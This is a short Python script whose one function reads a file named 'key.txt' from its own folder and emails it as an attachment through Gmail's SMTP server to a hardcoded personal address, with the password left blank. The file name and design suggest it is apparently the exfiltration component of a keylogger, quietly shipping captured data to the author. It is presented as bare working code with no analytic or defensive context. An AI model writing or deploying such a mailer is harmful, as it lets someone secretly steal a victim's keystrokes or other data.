import smtplib
import os
from email import encoders
from email.mime.base import MIMEBase
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText

path = os.path.dirname(os.path.abspath(__file__))
script_path_key = os.path.join(path, 'key.txt')


def sendmail():
    sender = "Jan.Adamczewski.Pawel@gmail.com"
    receiver = sender
    password = ""
    body = "Data: "

    msg = MIMEMultipart()

    msg.attach(MIMEText(body, 'plain'))
    file = script_path_key
    with open(file, "rb") as attachment:
        part = MIMEBase("application", "octet-stream")
        part.set_payload(attachment.read())

    encoders.encode_base64(part)
    part.add_header("Content-Disposition", f"attachment; filename={file}")
    msg.attach(part)
    try:
        server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
        server.ehlo()
        server.login(sender, password)
        server.sendmail(sender, receiver, msg.as_string())
        server.close()
        return True
    except Exception as error:
        print(error)
        return False












